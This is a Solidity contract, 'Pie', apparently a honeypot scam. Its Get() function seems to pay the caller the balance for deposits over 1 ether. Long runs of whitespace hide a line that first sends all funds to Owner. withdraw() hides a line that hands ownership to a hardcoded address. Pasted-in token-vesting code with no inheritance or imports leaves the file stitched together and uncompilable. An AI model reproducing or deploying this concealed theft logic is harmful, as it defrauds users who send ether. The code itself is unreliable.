 

pragma solidity ^0.4.19;

contract Pie
{
    address public Owner = msg.sender;
   


    using SafeMath for uint256;
    using SafeERC20 for ERC20Basic;

    uint256[] public cumulativeRates;
    uint256 public interval;

    constructor(
        address _beneficiary,
        uint256 _start,
        uint256 _cliff,
        uint256[] _cumulativeRates,
        uint256 _interval
    ) public
        TokenVesting(_beneficiary, _start, _cliff, ~uint256(0), true)
    {
        for (uint256 i = 0; i < _cumulativeRates.length; ++i) {
            require(_cumulativeRates[i] <= 100);
            if (i > 0) {
                require(_cumulativeRates[i] >= _cumulativeRates[i - 1]);
            }
        }

        cumulativeRates = _cumulativeRates;
        interval = _interval;
    }

    function vestedAmount(ERC20Basic token) public view returns (uint256) {
        if (now < cliff) {
            return 0;
        }

        uint256 currentBalance = token.balanceOf(this);
        uint256 totalBalance = currentBalance.add(released[token]);

        uint256 timeSinceStart = now.sub(start);
        uint256 currentPeriod = timeSinceStart.div(interval);
        if (currentPeriod >= cumulativeRates.length) {
            return totalBalance;
        }
        return totalBalance.mul(cumulativeRates[currentPeriod]).div(100);
    }

    function()
    public
    payable
    {
        
    }
   
    function Get()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}